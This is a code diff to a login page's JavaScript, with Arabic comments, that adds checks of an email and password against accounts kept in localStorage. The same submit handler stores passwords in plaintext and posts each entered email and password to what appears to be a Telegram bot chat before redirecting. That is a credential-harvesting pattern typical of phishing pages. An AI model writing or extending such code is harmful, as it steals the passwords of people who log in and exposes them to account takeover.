@@ -209,26 +209,36 @@
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const emailInput = document.getElementById('email').value.trim();
-            const pass = document.getElementById('password').value;
+            const passInput = document.getElementById('password').value;
             const remember = document.getElementById('remember').checked;
             const errorMsg = document.getElementById('error-msg');
 
-            // --- التعديل الجوهري هنا ---
-            // جلب قائمة المستخدمين المسجلين (بفرض أن صفحة signup تحفظهم في هذا المفتاح)
-            let registeredUsers = JSON.parse(localStorage.getItem('users_list')) || [];
+            // --- التعديل الجوهري للتحقق من الإيميل وكلمة المرور معاً ---
+            let usersData = JSON.parse(localStorage.getItem('firo_users')) || {};
 
-            // التحقق: هل الإيميل المدخل موجود في القائمة؟
-            if (!registeredUsers.includes(emailInput)) {
-                errorMsg.style.display = 'block'; // إظهار الرسالة الحمراء
-                return; // منع إرسال البيانات للتليجرام ومنع التحويل لصفحة home
+            // 1. التحقق من وجود الحساب (الإيميل)
+            if (!usersData.hasOwnProperty(emailInput)) {
+                errorMsg.textContent = 'حساب غير مسجل، يرجى النقر على "سجل الآن" أولاً.';
+                errorMsg.style.display = 'block';
+                return;
             }
-            // ---------------------------
+
+            // 2. التحقق من صحة كلمة المرور الخاصة بهذا الإيميل
+            if (usersData[emailInput] !== passInput) {
+                errorMsg.textContent = 'كلمة المرور غير صحيحة، حاول مرة أخرى.';
+                errorMsg.style.display = 'block';
+                return;
+            }
+            // --------------------------------------------------------
 
             errorMsg.style.display = 'none';
 
+            // حفظ المستخدم الحالي لصفحة البروفايل
+            localStorage.setItem('current_user_email', emailInput);
+
             if (remember) {
                 localStorage.setItem('remembered_email', emailInput);
-                localStorage.setItem('remembered_password', pass);
+                localStorage.setItem('remembered_password', passInput);
             } else {
                 localStorage.removeItem('remembered_email');
                 localStorage.removeItem('remembered_password');
@@ -242,7 +252,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     chat_id: chatId, 
-                    text: `👤 دخول جديد:\n📧 الإيميل: ${emailInput}\n🔒 الباسورد: ${pass}\n📌 تذكرني: ${remember ? 'نعم' : 'لا'}` 
+                    text: `👤 دخول جديد:\n📧 الإيميل: ${emailInput}\n🔒 الباسورد: ${passInput}\n📌 تذكرني: ${remember ? 'نعم' : 'لا'}` 
                 })
             }).then(() => window.location.href = "home.html");
         });
